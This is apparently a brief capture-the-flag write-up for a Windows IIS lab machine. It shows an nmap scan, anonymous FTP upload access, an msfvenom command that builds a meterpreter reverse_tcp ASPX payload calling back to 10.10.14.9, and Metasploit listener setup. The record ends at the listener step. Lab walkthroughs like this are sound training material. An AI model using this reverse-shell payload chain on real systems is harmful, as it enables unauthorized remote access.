![devel](https://user-images.githubusercontent.com/66635295/176747179-515a7195-1782-4254-a173-23b18a86530a.png)
**RECON**
---
**IIS Server (Windows)**
![recon](https://user-images.githubusercontent.com/66635295/176748219-b064f388-d683-4c33-bb29-52c20d8961c2.png)

**Nmap Scan**
<pre>nmap –p- -A -T4 10.10.10.5<pre/>
-allports -version -Aggressive
Port 21 allows for anonymous FTP Login
![nmap](https://user-images.githubusercontent.com/66635295/176748164-8d9bc8c3-02b3-4001-9ead-c9a2e7b90d0e.png)

**ENUMERATION**
---
**FTP Login** 
<pre>User: anonymous<pre/>
<pre>Pass: anonymous<pre/>
The connection allows files to be uploaded
![ftp](https://user-images.githubusercontent.com/66635295/176749228-6da8577b-6f75-41f9-a2a1-9ec36a6cc287.png)

**Msfvenom Payload**
<pre> -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx > ex aspx <pre/>
![msf](https://user-images.githubusercontent.com/66635295/176749731-c01f10d3-5894-4363-ab9c-08b91a0c0d61.png)

**Metasploit Listner**
<pre>use exploit/multi/handler<pre/>
<pre>set payload windows/meterpreter/reverse_tcp<pre/>
<pre>set LHOST 10.10.14.9<pre/>
![msf consoel](https://user-images.githubusercontent.com/66635295/176750030-1de89e38-2ce4-46b8-9934-5bf80018e2b5.png)
